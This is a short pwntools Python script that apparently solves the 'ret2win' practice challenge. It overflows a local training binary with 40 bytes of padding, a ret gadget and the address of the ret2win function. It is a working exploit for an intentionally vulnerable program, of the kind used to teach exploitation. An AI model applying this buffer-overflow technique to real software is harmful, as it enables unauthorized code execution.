#!/usr/bin/python3

from pwn import *

e = ELF('./ret2win')
p = process('./ret2win')

offset = 40

# address
ret2win = e.symbols['ret2win']

# gadgets
ret = 0x040053e

# payload
payload = b'A' * offset
payload += p64(ret)
payload += p64(ret2win)

p.send(payload)
output = p.recvall()

log.info(f'Sent {payload}')
log.info(f'Recv {output}')
